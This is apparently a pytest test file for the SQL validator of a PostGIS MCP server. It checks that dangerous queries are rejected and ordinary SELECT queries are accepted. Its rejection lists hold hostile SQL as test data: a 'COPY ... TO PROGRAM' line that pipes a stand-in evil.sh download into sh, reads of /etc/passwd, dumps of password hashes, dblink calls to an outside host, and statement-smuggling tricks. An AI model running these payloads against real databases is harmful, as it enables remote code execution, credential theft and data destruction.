"""The SQL guard: everything dangerous must be rejected, everything useful accepted. No database needed."""

from __future__ import annotations

import pytest

from mapsql_mcp.config import Settings
from mapsql_mcp.errors import GuardError, redact, register_secret
from mapsql_mcp.guard import validate_sql

MALICIOUS = [
    # --- DDL / DML / utility statements
    "DROP TABLE cities",
    "DROP SCHEMA public CASCADE",
    "DROP DATABASE postgres",
    "TRUNCATE cities",
    "DELETE FROM cities",
    "DELETE FROM cities WHERE id = 1",
    "UPDATE cities SET name = 'x'",
    "INSERT INTO cities (id) VALUES (1)",
    "INSERT INTO cities SELECT * FROM cities",
    "CREATE TABLE evil (a int)",
    "CREATE TABLE evil AS SELECT * FROM cities",
    "CREATE EXTENSION dblink",
    "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql",
    "CREATE ROLE hacker SUPERUSER LOGIN",
    "CREATE USER hacker",
    "ALTER TABLE cities DROP COLUMN name",
    "ALTER ROLE postgres PASSWORD 'x'",
    "ALTER SYSTEM SET log_statement = 'all'",
    "GRANT ALL ON cities TO PUBLIC",
    "REVOKE ALL ON cities FROM PUBLIC",
    "COMMENT ON TABLE cities IS 'x'",
    "VACUUM cities",
    "ANALYZE cities",
    "REINDEX TABLE cities",
    "CLUSTER cities",
    "REFRESH MATERIALIZED VIEW mv",
    "LOCK TABLE cities",
    "LISTEN ch",
    "NOTIFY ch, 'x'",
    "DO $$ BEGIN PERFORM 1; END $$",
    "CALL some_procedure()",
    "PREPARE p AS SELECT 1",
    "EXECUTE p",
    "DEALLOCATE p",
    "DECLARE c CURSOR FOR SELECT 1",
    "FETCH ALL FROM c",
    "DISCARD ALL",
    "RESET ALL",
    "SET statement_timeout = 0",
    "SET LOCAL statement_timeout = 0",
    "SET ROLE postgres",
    "SET SESSION AUTHORIZATION postgres",
    "SET TRANSACTION READ WRITE",
    "SET default_transaction_read_only = off",
    "SHOW ALL",
    "BEGIN",
    "COMMIT",
    "ROLLBACK",
    "START TRANSACTION READ WRITE",
    "SAVEPOINT x",
    "END",
    "EXPLAIN ANALYZE DELETE FROM cities",
    "EXPLAIN SELECT 1",
    "SECURITY LABEL ON TABLE cities IS 'x'",
    "IMPORT FOREIGN SCHEMA s FROM SERVER x INTO y",
    "CHECKPOINT",
    "LOAD 'auto_explain'",
    # --- COPY (file / program access)
    "COPY cities TO '/tmp/x'",
    "COPY cities TO PROGRAM 'curl evil.sh | sh'",
    "COPY (SELECT 1) TO STDOUT",
    "COPY cities FROM '/etc/passwd'",
    # --- multiple statements / smuggling
    "SELECT 1; DROP TABLE cities",
    "SELECT 1; SELECT 2",
    "SELECT 1;DELETE FROM cities",
    "SELECT 1; -- harmless\nDROP TABLE cities",
    "/* a */ SELECT 1; /* b */ DROP TABLE cities",
    "SELECT 'a'; UPDATE cities SET name = 'x'",
    "BEGIN; DROP TABLE cities; COMMIT",
    "SELECT 1; SET statement_timeout = 0",
    # --- data modifying CTEs / subqueries
    "WITH d AS (DELETE FROM cities RETURNING *) SELECT * FROM d",
    "WITH i AS (INSERT INTO cities (id) VALUES (1) RETURNING *) SELECT * FROM i",
    "WITH u AS (UPDATE cities SET name = 'x' RETURNING *) SELECT * FROM u",
    "WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT 1 FROM r) SELECT * FROM (WITH d AS (DELETE FROM t RETURNING 1) SELECT * FROM d) x",
    "SELECT * FROM (WITH d AS (DELETE FROM cities RETURNING *) SELECT * FROM d) AS q",
    "SELECT * INTO newtable FROM cities",
    "SELECT * INTO TEMP newtable FROM cities",
    "SELECT * FROM cities FOR UPDATE",
    "SELECT * FROM cities FOR SHARE",
    "SELECT * FROM cities FOR NO KEY UPDATE SKIP LOCKED",
    # --- file / OS / network access functions
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_read_file('/etc/passwd', 0, 100)",
    "SELECT pg_read_binary_file('/etc/passwd')",
    "SELECT pg_ls_dir('.')",
    "SELECT * FROM pg_ls_dir('/')",
    "SELECT * FROM pg_ls_waldir()",
    "SELECT pg_stat_file('/etc/passwd')",
    "SELECT PG_READ_FILE('/etc/passwd')",
    "SELECT \"pg_read_file\"('/etc/passwd')",
    "SELECT pg_catalog.pg_read_file('/etc/passwd')",
    "SELECT \"pg_catalog\".\"pg_read_file\"('/etc/passwd')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(1234, '/tmp/x')",
    "SELECT lo_get(1234)",
    "SELECT lo_create(0)",
    "SELECT lo_unlink(1234)",
    "SELECT loread(0, 10)",
    "SELECT lowrite(0, 'x')",
    "SELECT * FROM dblink('host=evil dbname=x', 'select 1') AS t(a int)",
    "SELECT dblink_connect('host=evil')",
    "SELECT dblink_exec('x', 'drop table y')",
    "SELECT * FROM public.dblink('x','y') t(a int)",
    "SELECT pg_sleep(100)",
    "SELECT * FROM pg_sleep(100)",
    "SELECT pg_terminate_backend(123)",
    "SELECT pg_cancel_backend(123)",
    "SELECT pg_reload_conf()",
    "SELECT pg_rotate_logfile()",
    "SELECT pg_switch_wal()",
    "SELECT pg_create_restore_point('x')",
    "SELECT pg_advisory_lock(1)",
    "SELECT pg_advisory_xact_lock(1)",
    "SELECT pg_try_advisory_lock(1)",
    "SELECT pg_notify('c', 'p')",
    "SELECT pg_logical_slot_get_changes('s', null, null)",
    "SELECT pg_create_logical_replication_slot('s', 'test_decoding')",
    "SELECT pg_export_snapshot()",
    "SELECT pg_backup_start('x')",
    "SELECT pg_is_in_recovery()",
    "SELECT pg_has_role('postgres', 'member')",
    "SELECT pg_get_functiondef(1)",
    "SELECT pg_read_file(path) FROM (SELECT '/etc/passwd' AS path) t",
    "SELECT (SELECT pg_read_file('/etc/passwd'))",
    "SELECT CASE WHEN true THEN pg_read_file('/etc/passwd') END",
    "SELECT coalesce(pg_read_file('/etc/passwd'), 'x')",
    "SELECT * FROM cities WHERE name = (SELECT pg_read_file('/etc/passwd'))",
    "SELECT * FROM cities ORDER BY pg_read_file('/etc/passwd')",
    "SELECT array_agg(pg_read_file('/x')) FROM cities",
    "WITH x AS (SELECT pg_read_file('/etc/passwd')) SELECT * FROM x",
    "SELECT set_config('statement_timeout', '0', false)",
    "SELECT set_config('default_transaction_read_only', 'off', false)",
    "SELECT set_config('search_path', 'evil', false)",
    "SELECT current_setting('data_directory')",
    "SELECT nextval('s')",
    "SELECT setval('s', 1)",
    "SELECT currval('s')",
    "SELECT lastval()",
    "SELECT query_to_xml('select * from pg_authid', true, true, '')",
    "SELECT table_to_xml('cities', true, true, '')",
    "SELECT database_to_xml(true, true, '')",
    "SELECT schema_to_xml('public', true, true, '')",
    "SELECT cursor_to_xml('c', 1, true, true, '')",
    "SELECT inet_server_addr()",
    "SELECT inet_client_addr()",
    "SELECT inet_server_port()",
    "SELECT crypt('a', gen_salt('bf'))",
    "SELECT pgp_sym_encrypt('a', 'b')",
    "SELECT AddGeometryColumn('public', 'cities', 'g2', 4326, 'POINT', 2)",
    "SELECT DropGeometryColumn('public', 'cities', 'geom')",
    "SELECT DropGeometryTable('cities')",
    "SELECT UpdateGeometrySRID('cities', 'geom', 3857)",
    "SELECT Populate_Geometry_Columns()",
    "SELECT postgis_enable_outdb_rasters()",
    # --- sensitive relations
    "SELECT * FROM pg_authid",
    "SELECT * FROM pg_catalog.pg_authid",
    "SELECT rolpassword FROM pg_authid",
    "SELECT * FROM pg_shadow",
    "SELECT * FROM pg_catalog.pg_shadow",
    "SELECT * FROM PG_SHADOW",
    "SELECT * FROM \"pg_shadow\"",
    "SELECT * FROM pg_user_mappings",
    "SELECT * FROM pg_user_mapping",
    "SELECT * FROM pg_stat_activity",
    "SELECT * FROM public.pg_stat_activity",
    "SELECT query FROM pg_stat_activity",
    "SELECT * FROM pg_settings",
    "SELECT * FROM pg_file_settings",
    "SELECT * FROM pg_hba_file_rules",
    "SELECT * FROM pg_largeobject",
    "SELECT * FROM pg_foreign_server",
    "SELECT * FROM pg_stat_ssl",
    "SELECT * FROM pg_replication_slots",
    "SELECT * FROM cities c JOIN pg_authid a ON true",
    "SELECT * FROM cities WHERE id IN (SELECT oid FROM pg_authid)",
    "WITH x AS (SELECT * FROM pg_authid) SELECT * FROM x",
    "SELECT * FROM (SELECT * FROM pg_shadow) q",
    "TABLE pg_authid",
    "SELECT * FROM pg_prepared_statements",
    "SELECT * FROM pg_locks",
    # --- weird / evasion attempts
    "",
    "   ",
    ";",
    ";;;",
    "--",
    "/* only a comment */",
    "SELEC 1",
    "SELECT 1 FROM",
    "SELECT 1)",
    "SELECT (1",
    "SELECT $$",
    "SELECT 'unterminated",
    "SELECT 1 /* unterminated",
    "SELECT \x00 1",
    "SELECT 1\x00; DROP TABLE x",
    "\\copy cities to '/tmp/x'",
    "\\! ls",
    "SELECT 1 \\gexec",
    "select 1 \\g",
    "SELECT * FROM cities; \\! ls",
    "S" + "ELECT 1; D" + "ROP TABLE x",
    "SELECT 1 UNION SELECT pg_read_file('/etc/passwd')",
    "SELECT 1 EXCEPT SELECT pg_read_file('/etc/passwd')",
    "(SELECT 1) UNION ALL (SELECT pg_read_file('/etc/passwd'))",
    "VALUES (pg_read_file('/etc/passwd'))",
    "SELECT * FROM generate_series(1, 2) g WHERE g = (SELECT length(pg_read_file('/etc/passwd')))",
    "SELECT 1 WHERE EXISTS (SELECT pg_read_file('/etc/passwd'))",
    "SELECT * FROM cities LIMIT (SELECT pg_sleep(10)::text::int)",
    "SELECT * FROM cities GROUP BY 1 HAVING pg_sleep(1) IS NULL",
    "SELECT * FROM LATERAL pg_ls_dir('/') x",
    "SELECT * FROM ROWS FROM (pg_ls_dir('/')) x",
    "SELECT * FROM ONLY pg_authid",
    "SELECT * FROM pg_authid TABLESAMPLE SYSTEM (100)",
    "SELECT pg_read_file('/etc/passwd')::text COLLATE \"C\"",
    "SELECT ARRAY[pg_read_file('/x')]",
    "SELECT ROW(pg_read_file('/x'))",
    "SELECT (pg_read_file('/x'))::text",
    "SELECT lo_import('/x') OVER ()",
    "SELECT pg_sleep(1) FILTER (WHERE true)",
    "SELECT count(*) FILTER (WHERE pg_read_file('/x') IS NULL) FROM cities",
    "SELECT * FROM cities c WHERE c.geom && (SELECT pg_read_file('/x')::geometry)",
    "SELECT string_agg(name, pg_read_file('/x')) FROM cities",
    "SELECT * FROM xmltable('/a' PASSING (SELECT query_to_xml('select 1',true,true,'')) COLUMNS x text)",
]


@pytest.mark.parametrize("sql", MALICIOUS)
def test_rejects_malicious(sql: str) -> None:
    with pytest.raises(GuardError):
        validate_sql(sql)


@pytest.mark.parametrize("sql", MALICIOUS)
def test_rejects_malicious_even_when_restricted(sql: str) -> None:
    s = Settings(schemas=("public",))
    with pytest.raises(GuardError):
        validate_sql(sql, s, known_relations={"public": {"cities"}})


ALLOWED = [
    "SELECT 1",
    "select 1;",
    "SELECT 1 /* a ; DROP TABLE x */",
    "SELECT 1 -- ; DROP TABLE x",
    "SELECT 'DROP TABLE x; DELETE FROM y' AS s",
    "SELECT * FROM cities",
    "SELECT name, pop FROM public.cities WHERE pop > 1000 ORDER BY pop DESC LIMIT 10",
    "SELECT count(*) FROM cities GROUP BY country HAVING count(*) > 1",
    "WITH big AS (SELECT * FROM cities WHERE pop > 100) SELECT * FROM big",
    "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * FROM r",
    "SELECT * FROM cities UNION ALL SELECT * FROM cities",
    "(SELECT 1) INTERSECT (SELECT 1)",
    "VALUES (1), (2)",
    "TABLE cities",
    "SELECT * FROM generate_series(1, 10) g",
    "SELECT ST_AsGeoJSON(geom) FROM cities",
    "SELECT ST_Distance(a.geom::geography, b.geom::geography) FROM cities a, cities b WHERE a.id < b.id",
    "SELECT * FROM cities WHERE ST_DWithin(geom::geography, ST_SetSRID(ST_MakePoint(1, 2), 4326)::geography, 500)",
    "SELECT * FROM cities WHERE geom && ST_MakeEnvelope(0, 0, 1, 1, 4326)",
    "SELECT * FROM cities ORDER BY geom <-> ST_SetSRID(ST_MakePoint(0, 0), 4326) LIMIT 5",
    "SELECT a.geom <#> b.geom, a.geom ~= b.geom, a.geom &&& b.geom, a.geom |=| b.geom FROM cities a, cities b",
    "SELECT a.geom @ b.geom, a.geom ~ b.geom, a.geom << b.geom, a.geom >> b.geom FROM cities a, cities b",
    "SELECT ST_Transform(geom, 3857) FROM cities",
    "SELECT ST_Area(ST_Transform(geom, 4326)::geography) / 1e6 FROM districts",
    "SELECT ST_Union(geom) FROM districts",
    "SELECT ST_ClusterDBSCAN(geom, 0.1, 2) OVER () FROM cities",
    "SELECT tags->>'name', tags ? 'x', tags @> '{\"a\":1}' FROM t",
    "SELECT * FROM cities WHERE name ILIKE '%a%' AND name ~ '^A' AND name !~* 'z'",
    "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY pop) FROM cities",
    "SELECT count(*) FILTER (WHERE pop > 10) FROM cities",
    "SELECT row_number() OVER (PARTITION BY country ORDER BY pop) FROM cities",
    "SELECT * FROM cities c, LATERAL (SELECT * FROM cities d WHERE d.id <> c.id LIMIT 1) x",
    "SELECT * FROM cities TABLESAMPLE SYSTEM (10)",
    "SELECT current_database(), version(), PostGIS_Full_Version()",
    "SELECT pg_typeof(1), pg_size_pretty(pg_total_relation_size('cities'))",
    "SELECT pg_relation_size('cities'), pg_database_size('x')",
    "SELECT * FROM information_schema.columns WHERE table_name = 'cities'",
    "SELECT * FROM geometry_columns",
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT * FROM pg_class",
    "SELECT * FROM spatial_ref_sys WHERE srid = 4326",
    "SELECT unnest(ARRAY[1, 2, 3])",
    "SELECT CASE WHEN pop > 1 THEN 'a' ELSE 'b' END FROM cities",
    "SELECT * FROM cities WHERE id = ANY(ARRAY[1, 2])",
    "SELECT * FROM cities WHERE id IN (SELECT id FROM cities LIMIT 2)",
    "SELECT (SELECT max(pop) FROM cities) AS m",
    "SELECT 1::text, '1'::int, 1.5::numeric(5, 2), now(), current_date",
    "SELECT date_trunc('day', now()), extract(year FROM now())",
    "SELECT string_agg(name, ', ') FROM cities",
    "SELECT jsonb_build_object('a', 1), to_jsonb(c) FROM cities c",
    "SELECT * FROM cities WHERE name = 'it''s'",
    "SELECT $1",
    "SELECT E'\\x41'",
    "SELECT U&'d\\0061t\\+000061' AS s",
    "SELECT \"name\" FROM \"public\".\"cities\"",
    "SELECT * FROM cities -- trailing comment",
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_accepts_legitimate(sql: str) -> None:
    res = validate_sql(sql)
    assert res.kind == "select"


def test_error_messages_are_helpful() -> None:
    with pytest.raises(GuardError, match="Only SELECT"):
        validate_sql("DELETE FROM x")
    with pytest.raises(GuardError, match="Multiple statements"):
        validate_sql("SELECT 1; SELECT 2")
    with pytest.raises(GuardError, match="pg_read_file"):
        validate_sql("SELECT pg_read_file('x')")
    with pytest.raises(GuardError, match="too long"):
        validate_sql("SELECT " + "1," * 20000 + "1")


def test_result_reports_touched_objects() -> None:
    res = validate_sql("SELECT ST_Area(geom) FROM osm.parks p JOIN cities c ON true")
    assert ("osm", "parks") in res.relations and (None, "cities") in res.relations
    assert "st_area" in res.functions


# ---------------------------------------------------------------------------- allowlist


def test_schema_allowlist_blocks_other_schemas() -> None:
    s = Settings(schemas=("public", "osm"))
    known = {"public": {"cities"}, "osm": {"roads"}, "secret": {"salaries"}}
    validate_sql("SELECT * FROM public.cities", s, known_relations=known)
    validate_sql("SELECT * FROM osm.roads", s, known_relations=known)
    validate_sql("SELECT * FROM cities", s, known_relations=known)
    for bad in [
        "SELECT * FROM secret.salaries",
        "SELECT * FROM salaries",
        "SELECT * FROM cities, secret.salaries",
        "SELECT * FROM pg_catalog.pg_class",
        "SELECT * FROM information_schema.tables",
        "SELECT * FROM pg_class",
        "SELECT * FROM pg_tables",
        "SELECT * FROM cities WHERE id IN (SELECT id FROM secret.salaries)",
        "WITH x AS (SELECT * FROM secret.salaries) SELECT * FROM x",
    ]:
        with pytest.raises(GuardError):
            validate_sql(bad, s, known_relations=known)


def test_cte_cannot_shadow_a_forbidden_table() -> None:
    s = Settings(schemas=("public",))
    known = {"public": {"cities"}, "secret": {"salaries"}}
    with pytest.raises(GuardError):
        validate_sql(
            "SELECT * FROM (WITH salaries AS (SELECT 1) SELECT * FROM salaries) a, salaries", s, known_relations=known
        )
    # a harmless CTE with a unique name is fine
    validate_sql("WITH tmp AS (SELECT * FROM cities) SELECT * FROM tmp", s, known_relations=known)


def test_layer_allowlist_patterns() -> None:
    s = Settings(layers=("public.cities", "osm.*", "parks"))
    known = {"public": {"cities", "roads"}, "osm": {"roads", "pois"}, "x": {"parks", "y"}}
    validate_sql("SELECT * FROM public.cities", s, known_relations=known)
    validate_sql("SELECT * FROM osm.pois", s, known_relations=known)
    validate_sql("SELECT * FROM x.parks", s, known_relations=known)
    with pytest.raises(GuardError):
        validate_sql("SELECT * FROM public.roads", s, known_relations=known)
    with pytest.raises(GuardError):
        validate_sql("SELECT * FROM x.y", s, known_relations=known)
    assert s.relation_allowed("osm", "anything")
    assert not s.relation_allowed("public", "roads")


def test_restricted_without_catalog_requires_qualified_names() -> None:
    s = Settings(schemas=("public",))
    with pytest.raises(GuardError, match="qualify"):
        validate_sql("SELECT * FROM cities", s, known_relations=None)
    validate_sql("SELECT * FROM public.cities", s, known_relations=None)


# ---------------------------------------------------------------------------- write mode

WRITE_OK = [
    "INSERT INTO t (a) VALUES (1)",
    "UPDATE t SET a = 1 WHERE id = 2",
    "DELETE FROM t WHERE id = 2",
    "CREATE TABLE t2 (a int)",
    "CREATE TABLE t2 AS SELECT * FROM t",
    "CREATE INDEX ON t USING gist (geom)",
    "CREATE VIEW v AS SELECT * FROM t",
    "ALTER TABLE t ADD COLUMN b int",
    "SELECT 1",
]
WRITE_BAD = [
    "UPDATE t SET a = 1",
    "DELETE FROM t",
    "DROP TABLE t",
    "TRUNCATE t",
    "ALTER TABLE t DROP COLUMN a",
    "ALTER TABLE t RENAME TO u",
    "ALTER ROLE x SUPERUSER",
    "CREATE ROLE x",
    "CREATE EXTENSION dblink",
    "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql",
    "GRANT ALL ON t TO PUBLIC",
    "COPY t TO PROGRAM 'x'",
    "INSERT INTO t VALUES (1); DROP TABLE t",
    "INSERT INTO t SELECT pg_read_file('/x')",
    "INSERT INTO t SELECT lo_import('/x')",
    "UPDATE t SET a = (SELECT pg_read_file('/x')) WHERE true",
    "SET ROLE postgres",
    "DO $$ BEGIN END $$",
    "WITH d AS (DROP TABLE x) SELECT 1",
    "SELECT * FROM pg_authid",
    "INSERT INTO pg_authid VALUES (1)",
    "SELECT set_config('a', 'b', false)",
]


@pytest.mark.parametrize("sql", WRITE_OK)
def test_write_mode_allows_scoped_writes(sql: str) -> None:
    validate_sql(sql, allow_write=True)


@pytest.mark.parametrize("sql", WRITE_BAD)
def test_write_mode_still_refuses_dangerous(sql: str) -> None:
    with pytest.raises(GuardError):
        validate_sql(sql, allow_write=True)


@pytest.mark.parametrize("sql", WRITE_OK[:-1])
def test_read_mode_refuses_all_writes(sql: str) -> None:
    with pytest.raises(GuardError):
        validate_sql(sql)


# ---------------------------------------------------------------------------- redaction


def test_redaction_removes_secrets() -> None:
    register_secret("s3cr3t-pw")
    for text in [
        "could not connect to postgresql://admin:s3cr3t-pw@db.internal:5432/prod",
        "connection failed: host=10.1.2.3 password=s3cr3t-pw dbname=x",
        "FATAL: password authentication failed for user \"admin\" (s3cr3t-pw)",
        "postgres://u:p@h/db is down",
    ]:
        out = redact(text)
        assert "s3cr3t-pw" not in out
        assert "db.internal" not in out
        assert "10.1.2.3" not in out
        assert "u:p@h" not in out
